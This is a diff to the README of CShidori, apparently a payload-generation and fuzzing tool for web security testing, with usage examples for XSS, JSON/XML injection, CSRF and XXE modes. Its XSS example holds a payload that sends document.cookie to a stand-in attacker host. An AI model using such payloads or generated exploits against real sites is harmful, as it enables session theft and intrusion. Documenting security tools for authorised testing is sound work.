@@ -16,6 +16,7 @@ Usage of all tools on this site for attacking targets without prior mutual conse
 
 ## Supported modes and payloads
 
+### Modes 
 * Mutation
 * XSS
 * JSON
@@ -25,17 +26,29 @@ Usage of all tools on this site for attacking targets without prior mutual conse
 * XXE
 * MSTest
 * Encoding
-* List Dump
+* List Generation
 
-## Usage
+### Payloads
+
+* Chars (default)
+* Strings (default)
+* DotNet
+* Java
+* Xss
+
+## Usage and examples
 
 ### Mutation
 
+generate 5 mutation (chars and bitflip) for the value "test" :
+
 ```powershell
-.\CShidori.exe -m mut -o 5 -p test
+.\CShidori.exe -m mut -o 5 -p test -d Chars
 ```
 
 ### XSS / Injections
+
+wrapp xss command to test multiples injections:
 
 ```powershell
 .\CShidori.exe -m xss -p 'document.location=\"https://attacker.lan?c=\"+document.cookie'
@@ -43,17 +56,23 @@ Usage of all tools on this site for attacking targets without prior mutual conse
 
 ### JSON
 
+Inject java and general payloads in all parameters of a Json request
+
 ```powershell
-.\CShidori.exe -m json -p ..\testing\test.json
+.\CShidori.exe -m json -p ..\testing\test.json -d Java,Strings
 ```
 
 ### XML
 
+Inject .NET payloads in all parameters of an XML request
+
 ```powershell
-.\CShidori.exe -m xml -p ..\testing\exemple.xml
+.\CShidori.exe -m xml -p ..\testing\exemple.xml -d DotNet
 ```
 
 ### GET
+
+Inject default payloads in all GET parameters and tests parameters polution
 
 ```powershell
 .\CShidori.exe -m get -p "?bar=foo&foo=bar"
@@ -61,32 +80,43 @@ Usage of all tools on this site for attacking targets without prior mutual conse
 
 ### CSRF
 
+Generate get and post CSRF exploits
+
 ```powershell
 .\CShidori.exe -m csrf -o get -p http://target.lan -i "name1=value1&name2=value2"
 .\CShidori.exe -m csrf -o post -p http://target.lan -i "name1=value1&name2=value2"
+
 ```
 
 ### XXE
+
+Generate XXE payload
 
 ```powershell
 .\CShidori.exe -m xxe
 ```
 ### MSTEST
-Test for Microsoft.VisualStudio.TestTools.UnitTesting
+
+Generate Test for Microsoft.VisualStudio.TestTools.UnitTesting (Beta)
+
 ```powershell
 .\CShidori.exe -m mst -p 'function( \"value1\", 2, FUZZ)' -i FUZZ
 ```
 
 ### Encode
 
+Encode your payload
+
 ```powershell
 .\CShidori.exe -m enc -p "<script>alert(1)</script>"
 ```
 
-### Dump
+### List Generation
+
+Generate a payload list
 
 ```powershell
-.\CShidori.exe -m dump
+.\CShidori.exe -m gen -d Chars,Java
 ```
 
 ## Miscellaneous
